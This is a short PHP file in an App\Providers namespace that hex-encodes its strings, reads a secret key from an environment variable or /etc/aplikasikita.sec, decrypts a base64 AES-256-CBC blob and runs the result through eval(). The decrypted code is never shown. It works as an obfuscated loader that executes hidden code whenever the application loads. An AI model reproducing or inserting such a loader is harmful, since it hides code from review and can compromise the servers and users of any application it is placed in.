<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TwQxX80s/EbX60bJPHrdaA==');

$c=base64_decode(

'Uggyb99OHuoVdrG5sOiz3JOZZj/0DJ4VtkMs9Wuv/F2JuQrMdhgvcilQhsMb9SWk4vWXfEa9hWCQ' .
'svkFOjCSkHmSfZyKmOOEfKHfh1N0w+1LM2hJQzF0VfJKYFMMglRfncuMGZbJ0+EHgcXJ3jnoWAfQ' .
'pq6OwtYenilEVlXWo6ptslpg7Rm/idga36tgvoG0GpLjJKUCaSiKtisbWMJtDJGdbvNbBG5DmYzn' .
'l59jJWJVHuTgevSP1BxsUU4wGeDjQA1k7ArHretQHvoHetPwgmAQWRAts/Zpcihl6fcjRdQskOfi' .
'KxJsQeAPnVqYhBn8tkJL2SjIOPsIGytoCbw/CuZsixVY0BmFi3zG9QQzFHGFnkq0M59OcisQD1Hv' .
'ANGa4YrBrTbrmkxr64OntxYGw3LOcFbhgyBbzHBZAL1aEOmQ2v40nF6Rxppm49JXiTcTBrccRoKY' .
'F2dr+vYDcLUacO9bzIMi91/9u8vID/rrv4z38+s00/pJZLn2RcES52oQ97tS6XBEgiEB+g31H0Ee' .
'sdaaeb2FSlhhmukchTVCn4lWyQCJfCXLe3VHFbEW3dWEWR7xFUcIX4i1gzS+R7iXRD8bwCSfV3jj' .
'6dHP5T48KulfBaaoze6U98wSNNlPKALCFlzBVD2rs4Gc79NE9Mc3zU9lwfFH7vtoh24s1xAAhq3n' .
'HeMLBVsLms/T2iUasGIIsbmb/G89MhMvQx4nl5lSYCI5L/awLkHDFwEJ/OiaLdhy2o4NKojLhUCl' .
'GRBRct2wOkmPWSXRPJULQlRvtNGRyPEU4w/vFK7udjBNtv5HoCw9aMfXJGqNC0zWVeXPIqfab0Ar' .
'BWbSnZcEV9veuSbf3vPuLTquL3z+WGRORMX8onEcLmHsA6BaHbubjwEaHUf/sjxI+aMGP9W7qXeK' .
'x0yuxVp1jk9fuTQHZlQJmh0C8Gz1Bq7P5JHfhuKdmLKXIA1m'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

